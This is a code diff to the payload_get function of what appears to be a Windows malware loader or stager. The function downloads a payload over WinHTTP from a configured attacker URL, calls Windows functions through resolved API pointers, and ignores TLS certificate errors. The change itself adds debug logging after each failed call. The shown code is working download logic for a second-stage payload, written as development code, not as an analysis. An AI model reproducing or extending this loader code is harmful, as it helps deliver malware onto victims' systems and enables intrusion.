@@ -33,8 +33,11 @@ LPVOID payload_get(PDWORD PayloadSize) {
     if (!hSession) goto CLEANUP;
 
     hConnect = g_ldr->apis->WinHttpConnect(hSession, g_ldr->config->http.url, g_ldr->config->http.port, 0);
-    if (!hConnect) goto CLEANUP;
-
+    if (!hConnect)
+    {
+        DBGA("[!] WinHttpConnect Failed: %lu\n", GetLastError());
+        goto CLEANUP;
+    }
 
     httpFlags = g_ldr->config->http.isSecure ? WINHTTP_FLAG_SECURE : 0;
 
@@ -42,8 +45,11 @@ LPVOID payload_get(PDWORD PayloadSize) {
         WINHTTP_NO_REFERER,
         WINHTTP_DEFAULT_ACCEPT_TYPES,
         httpFlags);
-    if (!hRequest) goto CLEANUP;
+    if (!hRequest) {
+        DBGA("[!] WinhttpOpenRequest Failed: %lu\n", GetLastError());
 
+        goto CLEANUP;
+    }
 
     if (g_ldr->config->http.isSecure) {
         DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID
@@ -56,14 +62,23 @@ LPVOID payload_get(PDWORD PayloadSize) {
         WINHTTP_NO_ADDITIONAL_HEADERS, 0,
         WINHTTP_NO_REQUEST_DATA, 0,
         0, 0);
-    if (!bResults) goto CLEANUP;
+    if (!bResults) {
+        DBGA("[!] WinHttpSendRequest Failed: %lu\n", GetLastError());
+        goto CLEANUP;
+    }
 
     bResults = g_ldr->apis->WinHttpReceiveResponse(hRequest, NULL);
-    if (!bResults) goto CLEANUP;
+    if (!bResults)
+    {
+        DBGA("[!] WinHttpReceiveResponse Failed: %lu\n", GetLastError());
 
+        goto CLEANUP;
+    }
     outBuffer = g_ldr->apis->LocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, bufferSize);
-    if (!outBuffer) goto CLEANUP;
-
+    if (!outBuffer) {
+        DBGA("[!] LocalAlloc Failed: %lu\n", GetLastError());
+        goto CLEANUP;
+    }
     do {
         Size = 0;
         if (!g_ldr->apis->WinHttpQueryDataAvailable(hRequest, &Size))
@@ -76,7 +91,11 @@ LPVOID payload_get(PDWORD PayloadSize) {
                 bufferSize *= 2;
             }
             outBuffer = g_ldr->apis->LocalReAlloc(outBuffer, bufferSize, LMEM_MOVEABLE);
-            if (!outBuffer) goto CLEANUP;
+            if (!outBuffer) {
+                DBGA("[!] LocalReAlloc Failed: %lu\n", GetLastError());
+
+                goto CLEANUP;
+            }
         }
 
         if (!g_ldr->apis->WinHttpReadData(hRequest, (PBYTE)outBuffer + TotalSize, Size, &Downloaded)) {
